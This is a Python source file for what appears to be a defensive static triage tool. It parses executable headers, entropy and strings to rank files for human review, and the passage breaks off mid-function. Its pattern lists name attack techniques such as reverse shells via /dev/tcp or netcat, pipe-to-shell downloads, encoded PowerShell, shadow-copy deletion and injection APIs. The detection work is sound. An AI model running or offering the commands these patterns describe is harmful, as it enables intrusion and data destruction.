#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 SUSPICIOUS EXECUTABLE DETECTOR (SUSPEX)
 Static triage of executables on one host - CLI + Web App
--------------------------------------------------------------------------------
 Author  : Karanam Shrivasta
 GitHub  : https://github.com/mrshrivasta
 LinkedIn: https://www.linkedin.com/in/karanam-shrivasta/
 Version : 1.0.0
--------------------------------------------------------------------------------
 WHAT THIS DOES
   Reads executables and scores them for how much they deserve a human's
   attention. It parses ELF, PE and Mach-O headers, measures entropy section by
   section, extracts strings, checks filesystem context (location, permissions,
   timestamps, whether any package owns the file) and reports the indicators it
   found - each with the reason it matters AND the ordinary situations in which
   it is completely normal.

 *** THIS IS NOT ANTIVIRUS AND IT CANNOT TELL YOU IF A FILE IS MALICIOUS. ***
   It has no signature database, no behavioural sandbox and no cloud reputation
   service, because those need network access and API keys and this tool has
   neither by design. It produces a TRIAGE PRIORITY - an ordering of what to look
   at first - not a verdict. A high score means "look at this"; it does not mean
   "this is malware". A low score means "nothing stood out", not "this is safe":
   competent malware is written specifically to score low here.

 IT NEVER EXECUTES ANYTHING
   Every check is static. Files are opened read-only and parsed as data. The tool
   does not run, load, link or emulate any binary it examines.

 WHAT TO DO WITH A HIGH SCORE
   Do NOT delete it. Deleting destroys the evidence and may break the system if
   the finding is a false positive - which it often will be.
     1. Note the SHA-256 this tool prints.
     2. Look it up on a reputation service yourself, or submit it to your own
        malware analysis pipeline. This tool deliberately does not upload
        anything: submitting a file can disclose confidential data, and on a
        targeted intrusion it tips off the attacker.
     3. If it still looks wrong, isolate the host and follow your incident
        process. Preserve the file; do not clean it in place.

 DATA INTEGRITY PROMISE
   Every indicator comes from bytes actually read from the file. Nothing is
   inferred that the data does not support. A file that cannot be read is
   reported as unreadable with the reason, never skipped silently. Where a check
   could not run - no package manager to ask about ownership, a truncated header -
   it is reported as not performed rather than as a pass.

 LEGAL AND SAFETY
   Examine only machines you own or are authorised to examine. If you point this
   at real malware samples, handle them as you would any live sample: an isolated
   machine, no execution, and proper containment. Reading a file is safe; what
   you do next is your responsibility. Provided "as is" with no warranty; the
   author accepts no liability for any loss, damage, deletion of files, or
   reliance on these findings.
================================================================================
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import io
import json
import math
import os
import platform
import re
import shutil
import socket
import sqlite3
import stat
import struct
import subprocess
import sys
import textwrap
import time
from datetime import datetime, timezone

APP_NAME = "Suspicious Executable Detector"
APP_SHORT = "SUSPEX"
VERSION = "1.0.0"
AUTHOR = "Karanam Shrivasta"
GITHUB = "https://github.com/mrshrivasta"
LINKEDIN = "https://www.linkedin.com/in/karanam-shrivasta/"
DEFAULT_DB = os.environ.get("SUSPEX_DB", "suspex.db")

DISCLAIMER_SHORT = (
    "Static triage only - never executes anything. NOT antivirus: no signatures, no sandbox, "
    "no reputation service. It produces a priority for human review, never a verdict. "
    "A high score means 'look at this', not 'this is malware'. Do not delete anything."
)
DISCLAIMER_LONG = textwrap.dedent(
    """\
    AUTHORISED USE ONLY. This tool reads executables as data and never runs, loads or
    emulates them. It is NOT antivirus: it has no signature database, no behavioural
    sandbox and no cloud reputation lookup, and it makes no network request. What it
    produces is a TRIAGE PRIORITY - an ordering of what a human should examine first.
    A high score means "look at this"; it does not mean the file is malicious, and most
    high scores on a normal machine are false positives with ordinary explanations. A low
    score means "nothing stood out", not "safe" - malware is written to score low here.
    Never delete a file on the strength of this report: deleting destroys evidence and
    breaks systems. Note the hash, check it against a reputation service yourself, and
    follow your own incident process. Provided "as is" with no warranty; the author
    accepts no liability for any loss, damage, deleted files, or reliance on these
    findings."""
)

SEVERITIES = ["critical", "high", "medium", "low", "info"]
SEV_WEIGHT = {"critical": 30.0, "high": 16.0, "medium": 7.0, "low": 2.5, "info": 0.0}
SEV_COLOR = {"critical": "#e5484d", "high": "#f76808", "medium": "#ffb224",
             "low": "#3e9dd8", "info": "#8b8f9b"}

PRIORITY_BANDS = [(60, "urgent review", "#e5484d"), (35, "review soon", "#f76808"),
                  (15, "worth a look", "#ffb224"), (5, "low priority", "#3e9dd8"),
                  (0, "nothing stood out", "#30a46c")]


def priority_of(score: float) -> tuple[str, str]:
    for cut, label, colour in PRIORITY_BANDS:
        if score >= cut:
            return label, colour
    return "nothing stood out", "#30a46c"


FORMAT_COLOR = {"ELF": "#f76808", "PE": "#00a4ef", "Mach-O": "#8b8f9b",
                "script": "#30a46c", "archive": "#9775fa", "data": "#6f7685",
                "unreadable": "#e5484d"}

# Directories where an executable is inherently more interesting. None of these
# are wrong on their own - build systems and installers use them constantly.
HOT_DIRECTORIES = {
    "/tmp": "world-writable scratch space; a common staging point for downloaded payloads",
    "/var/tmp": "survives reboots, and is world-writable",
    "/dev/shm": "shared memory, world-writable, and often missed by file integrity tools",
    "/run/shm": "shared memory, world-writable",
}

DEFAULT_SCAN_PATHS = ["/tmp", "/var/tmp", "/dev/shm", "/usr/local/bin", "/usr/local/sbin",
                      "/opt"]

# PE imports worth noticing. The comment on each is the reason it matters; the
# 'benign' field is when you would expect to see it in ordinary software.
PE_API_GROUPS = {
    "process-injection": {
        "apis": {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                 "NtCreateThreadEx", "QueueUserAPC", "SetThreadContext",
                 "RtlCreateUserThread", "NtWriteVirtualMemory", "NtMapViewOfSection"},
        "why": "The classic sequence for running code inside another process.",
        "benign": "Debuggers, profilers, anti-cheat, accessibility tools and some "
                  "installers do this legitimately.",
        "severity": "high", "need": 2,
    },
    "dynamic-resolution": {
        "apis": {"LoadLibraryA", "LoadLibraryW", "LoadLibraryExA", "GetProcAddress",
                 "LdrLoadDll", "LdrGetProcedureAddress"},
        "why": "Resolving APIs at runtime hides them from the import table, which is "
               "what packers and loaders do.",
        "benign": "Plugin hosts and anything with optional features resolve APIs "
                  "dynamically as a matter of course.",
        "severity": "low", "need": 2,
    },
    "anti-analysis": {
        "apis": {"IsDebuggerPresent", "CheckRemoteDebuggerPresent",
                 "NtQueryInformationProcess", "OutputDebugStringA", "GetTickCount64",
                 "NtSetInformationThread", "BlockInput"},
        "why": "Checks whether the program is being watched, and behaves differently "
               "if it is.",
        "benign": "Commercial software checks for debuggers to protect licensing, and "
                  "crash handlers call these routinely.",
        "severity": "medium", "need": 2,
    },
    "credential-access": {
        "apis": {"CredEnumerateA", "CredReadA", "LsaOpenPolicy", "SamConnect",
                 "CryptUnprotectData", "NetUserGetInfo"},
        "why": "Reads stored credentials or the security account database.",
        "benign": "Password managers, backup agents and domain tools use these.",
        "severity": "high", "need": 1,
    },
    "download": {
        "apis": {"URLDownloadToFileA", "URLDownloadToFileW", "InternetOpenUrlA",
                 "InternetReadFile", "WinHttpOpenRequest", "HttpSendRequestA"},
        "why": "Fetches content from the network, which is how second stages arrive.",
        "benign": "Any updater, browser or networked application.",
        "severity": "low", "need": 1,
    },
    "persistence": {
        "apis": {"RegSetValueExA", "RegSetValueExW", "CreateServiceA", "CreateServiceW",
                 "StartServiceA", "SetWindowsHookExA", "SetWindowsHookExW"},
        "why": "Registers something to run again later, or hooks other processes.",
        "benign": "Installers, services and input utilities all do this by design.",
        "severity": "low", "need": 2,
    },
    "keylogging": {
        "apis": {"GetAsyncKeyState", "GetKeyboardState", "RegisterRawInputDevices",
                 "SetWindowsHookExA", "GetForegroundWindow"},
        "why": "The combination used to record keystrokes and the window they went to.",
        "benign": "Games, screen readers, macro tools and remote desktop software.",
        "severity": "medium", "need": 3,
    },
}

# Packer and protector section names. Presence is a fact; packing is not a crime.
PACKER_SECTIONS = {
    "UPX0": "UPX", "UPX1": "UPX", "UPX2": "UPX", ".UPX0": "UPX", ".UPX1": "UPX",
    ".aspack": "ASPack", ".adata": "ASPack", ".ASPack": "ASPack",
    ".themida": "Themida", ".winlice": "WinLicense", ".vmp0": "VMProtect",
    ".vmp1": "VMProtect", ".vmp2": "VMProtect", ".enigma1": "Enigma",
    ".enigma2": "Enigma", ".petite": "Petite", ".MPRESS1": "MPRESS",
    ".MPRESS2": "MPRESS", ".nsp0": "NsPack", ".nsp1": "NsPack", "pebundle": "PEBundle",
    ".boom": "Boomerang", ".ccg": "CCG", ".charmve": "PIN tool", ".pklstb": "PKLite",
    "PEC2": "PECompact", ".Upack": "Upack", ".ByDwing": "Upack",
}

# Strings that are interesting inside a binary. Every one of these appears in
# legitimate software too - which is exactly why they are indicators, not proof.
SUSPICIOUS_STRINGS = [
    (r"(?i)powershell(?:\.exe)?\s+-(?:enc|encodedcommand|e)\b", "encoded PowerShell command",
     "high", "Legitimate management scripts occasionally use encoded commands to avoid "
     "quoting problems."),
    (r"(?i)\bIEX\s*\(\s*New-Object\s+Net\.WebClient", "PowerShell download-and-execute",
     "high", "Some installers and CI scripts genuinely bootstrap this way."),
    (r"(?i)curl\s+[^\n|]{0,120}\|\s*(?:ba)?sh", "pipe-to-shell installation",
     "medium", "A very common - if criticised - way to install legitimate software."),
    (r"(?i)wget\s+[^\n|]{0,120}\|\s*(?:ba)?sh", "pipe-to-shell installation",
     "medium", "As above."),
    (r"/dev/tcp/\d", "bash /dev/tcp network redirection", "high",
     "Rare outside connect-back shells, but valid shell scripting."),
    (r"(?i)\bnc\s+-e\b|\bncat\s+.*--exec", "netcat with command execution", "high",
     "Used in legitimate administration and in almost every reverse-shell tutorial."),
    (r"(?i)chattr\s+\+i|\bsetfattr\b", "making a file immutable", "medium",
     "System hardening uses this; so does malware protecting itself."),
    (r"(?i)history\s+-c|unset\s+HISTFILE|HISTFILE=/dev/null", "shell history tampering",
     "high", "Occasionally used in scripts that handle secrets."),
    (r"(?i)\bcrontab\s+-|/etc/cron\.[a-z]+/", "cron persistence", "low",
     "Any scheduled task legitimately touches cron."),
    (r"(?i)(?:LD_PRELOAD|LD_LIBRARY_PATH)\s*=", "library preloading", "medium",
     "Used by profilers, sandboxes and many legitimate wrappers."),
    (r"(?i)\bbase64\s+-d\b|\bbase64\s+--decode\b", "base64 decoding in a command",
     "low", "Ubiquitous in ordinary scripting."),
    (r"(?i)xmrig|stratum\+tcp://|minerd\b", "cryptocurrency mining", "high",
     "Legitimate on a machine that is deliberately mining."),
    (r"(?i)\b(?:kill|pkill)\s+-9\s+.{0,20}(?:av|antivirus|defender|clamd)",
     "attempting to stop security software", "critical",
     "Very hard to explain innocently; investigate."),
    (r"(?i)vssadmin\s+delete\s+shadows|wbadmin\s+delete\s+catalog",
     "deleting backups or shadow copies", "critical",
     "Standard ransomware behaviour. Backup software does not do this."),
    (r"(?i)bcdedit\s+/set\s+.{0,30}recoveryenabled\s+no", "disabling Windows recovery",
     "critical", "Standard ransomware behaviour."),
]

URL_RE = re.compile(rb"(?:https?|ftp)://[A-Za-z0-9.\-_:/?#\[\]@!$&'()*+,;=%~]{4,180}")
IPV4_RE = re.compile(rb"\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}"
                     rb"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b")
ONION_RE = re.compile(rb"[a-z2-7]{16,56}\.onion")

IS_WINDOWS = os.name == "nt"
IS_MAC = sys.platform == "darwin"
IS_LINUX = sys.platform.startswith("linux")

MAX_FILE_BYTES = 64 * 1024 * 1024      # files larger than this are hashed but not parsed
STRINGS_WINDOW = 4 * 1024 * 1024       # how much of a file to scan for strings


# =============================================================================
# SECTION 1 - Utilities
# =============================================================================

def now_iso() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def ts_pretty(iso: str | None) -> str:
    if not iso:
        return "-"
    try:
        return datetime.fromisoformat(iso).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return iso


def clamp(v, lo, hi):
    return max(lo, min(hi, v))


def html_escape(s) -> str:
    s = "" if s is None else str(s)
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
             .replace('"', "&quot;"))


def fmt_bytes(n, precision: int = 1) -> str:
    if n is None:
        return "-"
    n = float(n)
    for unit in ("B", "KiB", "MiB", "GiB", "TiB"):
        if n < 1024 or unit == "TiB":
            return f"{n:.{0 if unit == 'B' else precision}f} {unit}"
        n /= 1024.0
    return f"{n:.{precision}f} TiB"


def entropy(data: bytes) -> float:
    """Shannon entropy in bits per byte. 8.0 means compressed or encrypted."""
    if not data:
        return 0.0
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    n = len(data)
    e = 0.0
    for c in counts:
        if c:
            p = c / n
            e -= p * math.log2(p)
    return round(e, 3)


def run(cmd: list[str], timeout: int = 30) -> dict:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           errors="replace")
        return {"ok": p.returncode == 0, "out": p.stdout or "",
                "err": (p.stderr or "").strip()}
    except FileNotFoundError:
        return {"ok": False, "out": "", "err": f"{cmd[0]}: not installed"}
    except Exception as e:
        return {"ok": False, "out": "", "err": str(e)}


def have(binary: str) -> bool:
    return shutil.which(binary) is not None


def sha256_of(path: str) -> tuple[str | None, str | None]:
    h = hashlib.sha256()
    try:
        with open(path, "rb") as fh:
            for chunk in iter(lambda: fh.read(1024 * 1024), b""):
                h.update(chunk)
        return h.hexdigest(), None
    except Exception as e:
        return None, str(e)


def printable_strings(data: bytes, minimum: int = 5) -> list[bytes]:
    """ASCII and UTF-16LE strings, the way the classic 'strings' tool works."""
    out = re.findall(rb"[\x20-\x7e]{%d,}" % minimum, data)
    wide = re.findall(rb"(?:[\x20-\x7e]\x00){%d,}" % minimum, data)
    out += [w.replace(b"\x00", b"") for w in wide]
    return out


class Indicator:
    """One observation about a file, with the reason it matters and when it is normal."""

    __slots__ = ("code", "title", "severity", "detail", "evidence", "benign", "weight")

    def __init__(self, code, title, severity, detail, evidence="", benign=""):
        self.code = code
        self.title = title
        self.severity = severity
        self.detail = detail
        self.evidence = str(evidence)[:1200]
        self.benign = benign
        self.weight = SEV_WEIGHT.get(severity, 0.0)

    def as_dict(self):
        return {"code": self.code, "title": self.title, "severity": self.severity,
                "detail": self.detail, "evidence": self.evidence, "benign": self.benign}


# =============================================================================
# SECTION 2 - Format parsers (pure functions over bytes - fully testable)
#   Everything here is static parsing. No file is ever executed, loaded or
#   mapped; the bytes are treated as data and nothing else.
# =============================================================================

ELF_TYPES = {0: "none", 1: "relocatable", 2: "executable", 3: "shared object/PIE",
             4: "core dump"}
ELF_MACHINES = {0x03: "x86", 0x3e: "x86-64", 0x28: "ARM", 0xb7: "AArch64",
                0x08: "MIPS", 0x14: "PowerPC", 0x15: "PPC64", 0xf3: "RISC-V",
                0x02: "SPARC", 0x32: "IA-64"}
PT_LOAD, PT_DYNAMIC, PT_INTERP = 1, 2, 3
PT_GNU_STACK, PT_GNU_RELRO = 0x6474E551, 0x6474E552
PF_X, PF_W, PF_R = 1, 2, 4
SHF_EXECINSTR, SHF_WRITE, SHF_ALLOC = 0x4, 0x1, 0x2
DT_NEEDED, DT_RPATH, DT_RUNPATH = 1, 15, 29


def parse_elf(data: bytes) -> dict:
    """Parse an ELF header, sections, segments and dynamic entries."""
    out = {"format": "ELF", "ok": False, "errors": [], "sections": [], "segments": [],
           "needed": [], "rpath": [], "runpath": [], "interp": None, "stripped": None,
           "static": None, "nx": None, "relro": None, "pie": None, "canary": None}
    if len(data) < 52 or data[:4] != b"\x7fELF":
        out["errors"].append("not an ELF file")
        return out
    is64 = data[4] == 2
    little = data[5] == 1
    e = "<" if little else ">"
    out["bits"] = 64 if is64 else 32
    out["endian"] = "little" if little else "big"
    try:
        (etype, machine) = struct.unpack(e + "HH", data[16:20])
        out["type"] = ELF_TYPES.get(etype, f"type {etype}")
        out["type_id"] = etype
        out["machine"] = ELF_MACHINES.get(machine, f"machine 0x{machine:x}")
        if is64:
            entry, phoff, shoff = struct.unpack(e + "QQQ", data[24:48])
            phentsize, phnum, shentsize, shnum, shstrndx = struct.unpack(
                e + "HHHHH", data[54:64])
        else:
            entry, phoff, shoff = struct.unpack(e + "III", data[24:36])
            phentsize, phnum, shentsize, shnum, shstrndx = struct.unpack(
                e + "HHHHH", data[42:52])
    except struct.error as exc:
        out["errors"].append(f"truncated ELF header: {exc}")
        return out
    out["entry"] = entry
    out["ok"] = True

    # ---- program headers ----
    for i in range(min(phnum, 128)):
        off = phoff + i * phentsize
        if off + phentsize > len(data):
            out["errors"].append("program header table runs past end of file")
            break
        try:
            if is64:
                p_type, p_flags = struct.unpack(e + "II", data[off:off + 8])
                p_offset, p_vaddr = struct.unpack(e + "QQ", data[off + 8:off + 24])
                p_filesz, p_memsz = struct.unpack(e + "QQ", data[off + 32:off + 48])
            else:
                p_type, p_offset, p_vaddr = struct.unpack(e + "III", data[off:off + 12])
                p_filesz, p_memsz, p_flags = struct.unpack(e + "III", data[off + 16:off + 28])
        except struct.error:
            break
        seg = {"type": p_type, "flags": p_flags, "offset": p_offset, "vaddr": p_vaddr,
               "filesz": p_filesz, "memsz": p_memsz,
               "perm": ("r" if p_flags & PF_R else "-") + ("w" if p_flags & PF_W else "-")
                       + ("x" if p_flags & PF_X else "-")}
        out["segments"].append(seg)
        if p_type == PT_INTERP and p_offset + p_filesz <= len(data):
            out["interp"] = data[p_offset:p_offset + p_filesz].split(b"\x00")[0].decode(
                "utf-8", "replace")
        if p_type == PT_GNU_STACK:
            out["nx"] = not bool(p_flags & PF_X)
        if p_type == PT_GNU_RELRO:
            out["relro"] = True
    if out["nx"] is None and out["segments"]:
        out["nx"] = None          # no GNU_STACK segment: unknown, not "off"
    if out["relro"] is None:
        out["relro"] = False
    out["pie"] = (etype == 3 and out["interp"] is not None)
    out["static"] = out["interp"] is None and etype in (2, 3)

    # ---- section headers ----
    if shnum == 0 or shoff == 0:
        out["stripped"] = True
        out["errors"].append("no section header table")
        return out
    names_blob = b""
    if shstrndx < shnum:
        soff = shoff + shstrndx * shentsize
        try:
            if is64:
                str_off, str_size = struct.unpack(e + "QQ", data[soff + 24:soff + 40])
            else:
                str_off, str_size = struct.unpack(e + "II", data[soff + 16:soff + 24])
            names_blob = data[str_off:str_off + str_size]
        except (struct.error, IndexError):
            out["errors"].append("section name table unreadable")

    def name_at(idx):
        end = names_blob.find(b"\x00", idx)
        return names_blob[idx:end if end >= 0 else None].decode("utf-8", "replace")

    dynstr = b""
    dynamic_off = dynamic_size = 0
    for i in range(min(shnum, 256)):
        off = shoff + i * shentsize
        if off + shentsize > len(data):
            out["errors"].append("section header table runs past end of file")
            break
        try:
            if is64:
                sh_name, sh_type = struct.unpack(e + "II", data[off:off + 8])
                sh_flags, sh_addr, sh_offset, sh_size = struct.unpack(
                    e + "QQQQ", data[off + 8:off + 40])
            else:
                sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = struct.unpack(
                    e + "IIIIII", data[off:off + 24])
        except struct.error:
            break
        nm = name_at(sh_name) if names_blob else f"section{i}"
        blob = data[sh_offset:sh_offset + sh_size] if sh_type != 8 else b""  # skip .bss
        sec = {"name": nm, "type": sh_type, "flags": sh_flags, "addr": sh_addr,
               "offset": sh_offset, "size": sh_size,
               "perm": ("w" if sh_flags & SHF_WRITE else "-")
                       + ("x" if sh_flags & SHF_EXECINSTR else "-"),
               "entropy": entropy(blob[:1024 * 1024]) if blob else 0.0}
        out["sections"].append(sec)
        if nm == ".dynstr":
            dynstr = blob
        elif nm == ".dynamic":
            dynamic_off, dynamic_size = sh_offset, sh_size
        elif nm in (".symtab",):
            out["stripped"] = False
    if out["stripped"] is None:
        out["stripped"] = not any(s["name"] == ".symtab" for s in out["sections"])

    # ---- dynamic entries: libraries and search paths ----
    if dynamic_off and dynstr:
        step = 16 if is64 else 8
        fmt = e + ("Qq" if is64 else "Ii")
        for off in range(dynamic_off, min(dynamic_off + dynamic_size, len(data)) - step + 1,
                         step):
            try:
                tag, val = struct.unpack(fmt, data[off:off + step])
            except struct.error:
                break
            if tag == 0:
                break
            if tag in (DT_NEEDED, DT_RPATH, DT_RUNPATH) and 0 <= val < len(dynstr):
                end = dynstr.find(b"\x00", val)
                s = dynstr[val:end if end >= 0 else None].decode("utf-8", "replace")
                if tag == DT_NEEDED:
                    out["needed"].append(s)
                elif tag == DT_RPATH:
                    out["rpath"].append(s)
                else:
                    out["runpath"].append(s)
    blob_all = dynstr + b""
    out["canary"] = b"__stack_chk_fail" in data[:MAX_FILE_BYTES]
    return out


PE_MACHINES = {0x014c: "x86", 0x8664: "x86-64", 0x01c0: "ARM", 0xaa64: "ARM64",
               0x0200: "IA-64", 0x01c4: "ARMv7"}
PE_SUBSYSTEMS = {1: "native", 2: "Windows GUI", 3: "Windows console", 5: "OS/2",
                 7: "POSIX", 9: "Windows CE", 10: "EFI application",
                 12: "EFI runtime driver", 16: "boot application"}
SCN_EXECUTE, SCN_READ, SCN_WRITE = 0x20000000, 0x40000000, 0x80000000


def parse_pe(data: bytes) -> dict:
    """Parse a PE/COFF header, sections, imports and data directories."""
    out = {"format": "PE", "ok": False, "errors": [], "sections": [], "imports": {},
           "signed_directory": False, "tls_callbacks": False, "overlay": 0,
           "dll": False, "timestamp": None}
    if len(data) < 0x40 or data[:2] != b"MZ":
        out["errors"].append("not a PE file (no MZ header)")
        return out
    try:
        (e_lfanew,) = struct.unpack("<I", data[0x3c:0x40])
    except struct.error:
        out["errors"].append("truncated DOS header")
        return out
    if e_lfanew + 24 > len(data) or data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        out["errors"].append("MZ header present but no PE signature - DOS-era or corrupt")
        return out
    coff = e_lfanew + 4
    try:
        machine, nsections, timestamp, _symtab, _nsyms, opt_size, characteristics = \
            struct.unpack("<HHIIIHH", data[coff:coff + 20])
    except struct.error:
        out["errors"].append("truncated COFF header")
        return out
    out["ok"] = True
    out["machine"] = PE_MACHINES.get(machine, f"machine 0x{machine:x}")
    out["characteristics"] = characteristics
    out["dll"] = bool(characteristics & 0x2000)
    out["timestamp_raw"] = timestamp
    if 0 < timestamp < 4102444800:
        out["timestamp"] = datetime.fromtimestamp(timestamp, tz=timezone.utc).replace(
            microsecond=0).isoformat()
    opt = coff + 20
    dirs = []
    if opt_size and opt + 2 <= len(data):
        (magic,) = struct.unpack("<H", data[opt:opt + 2])
        plus = magic == 0x20b
        out["pe32plus"] = plus
        try:
            (out["entry"],) = struct.unpack("<I", data[opt + 16:opt + 20])
            (subsystem, dllchar) = struct.unpack("<HH", data[opt + 68:opt + 72])
            out["subsystem"] = PE_SUBSYSTEMS.get(subsystem, f"subsystem {subsystem}")
            out["dll_characteristics"] = dllchar
            out["aslr"] = bool(dllchar & 0x0040)
            out["dep"] = bool(dllchar & 0x0100)
            out["cfg"] = bool(dllchar & 0x4000)
            ddir = opt + (112 if plus else 96)
            (nrva,) = struct.unpack("<I", data[opt + (108 if plus else 92):
                                               opt + (112 if plus else 96)])
            for i in range(min(nrva, 16)):
                o = ddir + i * 8
                if o + 8 > len(data):
                    break
                dirs.append(struct.unpack("<II", data[o:o + 8]))
        except struct.error as exc:
            out["errors"].append(f"truncated optional header: {exc}")
    if len(dirs) > 4 and dirs[4][0] and dirs[4][1]:
        out["signed_directory"] = True
    if len(dirs) > 9 and dirs[9][0]:
        out["tls_callbacks"] = True

    # ---- sections ----
    sec_start = opt + opt_size
    end_of_raw = 0
    for i in range(min(nsections, 96)):
        off = sec_start + i * 40
        if off + 40 > len(data):
            out["errors"].append("section table runs past end of file")
            break
        raw = data[off:off + 40]
        name = raw[:8].rstrip(b"\x00").decode("utf-8", "replace")
        vsize, vaddr, rawsize, rawptr = struct.unpack("<IIII", raw[8:24])
        (chars,) = struct.unpack("<I", raw[36:40])
        blob = data[rawptr:rawptr + min(rawsize, 1024 * 1024)] if rawptr and rawsize else b""
        out["sections"].append({
            "name": name, "vsize": vsize, "vaddr": vaddr, "rawsize": rawsize,
            "rawptr": rawptr, "characteristics": chars,
            "perm": ("r" if chars & SCN_READ else "-") + ("w" if chars & SCN_WRITE else "-")
                    + ("x" if chars & SCN_EXECUTE else "-"),
            "entropy": entropy(blob) if blob else 0.0})
        end_of_raw = max(end_of_raw, rawptr + rawsize)
    if end_of_raw and len(data) > end_of_raw:
        out["overlay"] = len(data) - end_of_raw

    # ---- imports ----
    def rva_to_offset(rva):
        for s in out["sections"]:
            if s["vaddr"] <= rva < s["vaddr"] + max(s["vsize"], s["rawsize"]):
                return s["rawptr"] + (rva - s["vaddr"])
        return None

    if len(dirs) > 1 and dirs[1][0]:
        off = rva_to_offset(dirs[1][0])
        idx = 0
        while off is not None and off + 20 <= len(data) and idx < 64:
            try:
                ilt, _t, _f, name_rva, iat = struct.unpack("<IIIII", data[off:off + 20])
            except struct.error:
                break
            if not (ilt or name_rva or iat):
                break
            noff = rva_to_offset(name_rva)
            dll = "?"
            if noff and noff < len(data):
                end = data.find(b"\x00", noff)
                dll = data[noff:end if end >= 0 else noff + 32].decode("utf-8", "replace")
            thunk_rva = ilt or iat
            funcs = []
            toff = rva_to_offset(thunk_rva) if thunk_rva else None
            step = 8 if out.get("pe32plus") else 4
            fmt = "<Q" if step == 8 else "<I"
            k = 0
            while toff is not None and toff + step <= len(data) and k < 512:
                try:
                    (val,) = struct.unpack(fmt, data[toff:toff + step])
                except struct.error:
                    break
                if val == 0:
                    break
                ordinal_flag = (1 << 63) if step == 8 else (1 << 31)
                if not val & ordinal_flag:
                    fo = rva_to_offset(val)
                    if fo and fo + 2 < len(data):
                        end = data.find(b"\x00", fo + 2)
                        funcs.append(data[fo + 2:end if end >= 0 else fo + 34].decode(
                            "utf-8", "replace"))
                else:
                    funcs.append(f"ordinal#{val & 0xffff}")
                toff += step
                k += 1
            if dll != "?":
                out["imports"][dll] = funcs
            off += 20
            idx += 1
    return out


def parse_macho(data: bytes) -> dict:
    out = {"format": "Mach-O", "ok": False, "errors": [], "sections": [], "universal": False}
    if len(data) < 8:
        out["errors"].append("too short")
        return out
    magic = data[:4]
    if magic in (b"\xca\xfe\xba\xbe", b"\xbe\xba\xfe\xca"):
        out["ok"] = True
        out["universal"] = True
        try:
            (n,) = struct.unpack(">I", data[4:8])
            out["arch_count"] = n
        except struct.error:
            pass
        return out
    order = None
    if magic in (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf"):
        order, is64 = ">", magic[3] == 0xcf
    elif magic in (b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe"):
        order, is64 = "<", magic[0] == 0xcf
    if order is None:
        out["errors"].append("not a Mach-O file")
        return out
    out["ok"] = True
    out["bits"] = 64 if is64 else 32
    try:
        cputype, _sub, filetype, ncmds = struct.unpack(order + "iiII", data[4:20])
        out["cputype"] = {7: "x86", 0x01000007: "x86-64", 12: "ARM",
                          0x0100000c: "ARM64"}.get(cputype, f"cpu {cputype}")
        out["filetype"] = {1: "object", 2: "executable", 6: "dylib", 8: "bundle",
                           10: "dSYM"}.get(filetype, f"type {filetype}")
        out["ncmds"] = ncmds
    except struct.error as exc:
        out["errors"].append(f"truncated header: {exc}")
    return out


SCRIPT_SHEBANGS = {
    b"sh": "shell", b"bash": "shell", b"dash": "shell", b"zsh": "shell", b"ksh": "shell",
    b"python": "python", b"python3": "python", b"perl": "perl", b"ruby": "ruby",
    b"node": "node", b"php": "php", b"lua": "lua", b"awk": "awk", b"env": "env-dispatch",
}


def detect_format(data: bytes, path: str = "") -> str:
    if len(data) < 4:
        return "data"
    if data[:4] == b"\x7fELF":
        return "ELF"
    if data[:2] == b"MZ":
        return "PE"
    if data[:4] in (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf", b"\xce\xfa\xed\xfe",
                    b"\xcf\xfa\xed\xfe", b"\xca\xfe\xba\xbe"):
        return "Mach-O"
    if data[:2] == b"#!":
        return "script"
    if data[:2] == b"PK" or data[:4] == b"Rar!" or data[:6] == b"7z\xbc\xaf\x27\x1c" \
            or data[:2] == b"\x1f\x8b":
        return "archive"
    return "data"


# =============================================================================
# SECTION 3 - Content and context analysis
# =============================================================================

def analyse_strings(data: bytes) -> dict:
    """Extract network indicators and command patterns from a file's strings."""
    window = data[:STRINGS_WINDOW]
    blob = b"\n".join(printable_strings(window))
    urls = sorted({u.decode("utf-8", "replace") for u in URL_RE.findall(blob)})
    ips = sorted({i.decode("ascii", "replace") for i in IPV4_RE.findall(blob)})
    onions = sorted({o.decode("ascii", "replace") for o in ONION_RE.findall(blob)})
    text = blob.decode("utf-8", "replace")
    hits = []
    for pattern, label, severity, benign in SUSPICIOUS_STRINGS:
        m = re.search(pattern, text)
        if m:
            hits.append({"label": label, "severity": severity, "benign": benign,
                         "match": m.group(0)[:160]})
    # ignore the loopback and unspecified addresses: they carry no information
    ips = [i for i in ips if not i.startswith(("127.", "0.0.0.0", "255.255.255"))]
    return {"urls": urls[:60], "ips": ips[:60], "onions": onions[:20], "hits": hits,
            "string_count": len(printable_strings(window))}


def find_embedded_executables(data: bytes) -> list[dict]:
    """Executable headers appearing somewhere other than the start of the file."""
    found = []
    for magic, label in ((b"\x7fELF", "ELF"), (b"MZ\x90\x00", "PE"),
                         (b"\xcf\xfa\xed\xfe", "Mach-O")):
        start = 1
        while True:
            i = data.find(magic, start)
            if i < 0 or len(found) >= 12:
                break
            # a PE magic needs a plausible e_lfanew to be worth reporting
            if label == "PE":
                try:
                    (lf,) = struct.unpack("<I", data[i + 0x3c:i + 0x40])
                    if not (0x40 <= lf < len(data) - i - 4) or \
                            data[i + lf:i + lf + 2] != b"PE":
                        start = i + 1
                        continue
                except struct.error:
                    start = i + 1
                    continue
            found.append({"offset": i, "type": label})
            start = i + 1
    return found


def filesystem_context(path: str) -> dict:
    """Permissions, ownership, timestamps and package ownership."""
    ctx = {"errors": []}
    try:
        lst = os.lstat(path)
    except OSError as e:
        ctx["errors"].append(str(e))
        return ctx
    # A symlink's own mode is always lrwxrwxrwx on Linux and says nothing about
    # access: the target's permissions govern. Checking the link would report every
